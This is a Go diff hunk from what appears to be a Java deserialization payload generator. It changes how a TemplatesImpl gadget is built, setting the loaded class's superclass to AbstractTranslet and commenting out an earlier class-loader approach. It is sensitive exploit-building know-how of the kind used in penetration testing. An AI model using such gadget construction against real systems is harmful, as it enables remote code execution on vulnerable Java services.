@@ -280,11 +280,15 @@ func GenerateTemplateImplGadget(name string, opts ...GenClassOptionFun) (*JavaOb
 	if err != nil {
 		return nil, err
 	}
-	newOpts := append(opts, SetClassType(ClassTemplateImplClassLoader), SetClassBytes(classObj.Bytes()), SetClassName(utils.RandStringBytes(5)))
-	classObj, err = GenerateClass(newOpts...) // load target class by TemplateImpl loader that can load any class
+	err = JavaClassModifySuperClass(classObj, "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet")
 	if err != nil {
 		return nil, err
 	}
+	//newOpts := append(opts, SetClassType(ClassTemplateImplClassLoader), SetClassBytes(classObj.Bytes()), SetClassName(utils.RandStringBytes(5)))
+	//classObj, err = GenerateClass(newOpts...) // load target class by TemplateImpl loader that can load any class
+	//if err != nil {
+	//	return nil, err
+	//}
 	objs, err := yserx.ParseJavaSerialized(cfg.Template)
 	if err != nil {
 		return nil, err
